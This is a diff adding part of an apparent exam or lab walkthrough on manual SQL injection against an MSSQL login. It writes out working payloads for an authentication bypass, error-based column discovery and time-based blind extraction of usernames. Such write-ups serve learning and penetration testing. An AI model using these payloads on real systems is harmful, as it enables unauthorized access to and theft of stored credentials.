@@ -90,4 +90,41 @@ Attempts to log in using the usernames ```admin``` and ```administrator``` faile
 ' or 1=1  ; --
 ```
 
+![image](2)
 
+Because we can't use automatic exploitation tools in the exam, I start doing it manually.
+
+First, we must know the name of the field.
+
+```SQL
+' HAVING 1=1 --
+```
+
+![image](3)
+
+```SQL
+' GROUP BY users.username HAVING 1=1 --
+```
+
+![image](4)
+
+```SQL
+' GROUP BY users.username, users.password_hash HAVING 1=1 --
+```
+
+![image](5)
+
+Now we know that the data table users has two fields username and password_hash.
+
+Check how many data are in the data table users. We can see from the query below that there is only one data.
+
+```SQL
+'; IF (SELECT COUNT(*) FROM users) = 1 WAITFOR DELAY '00:00:05' --
+```
+Finding the username.
+
+```
+-- e.g. guess username (ASCII)
+'; IF (ASCII(LOWER(SUBSTRING((SELECT TOP 1 username FROM users), 1, 1))) > 97) WAITFOR DELAY '00:00:05' --
+'; IF (ASCII(LOWER(SUBSTRING((SELECT TOP 1 username FROM users), 1, 1))) > 98) WAITFOR DELAY '00:00:05' -- and so on
+```
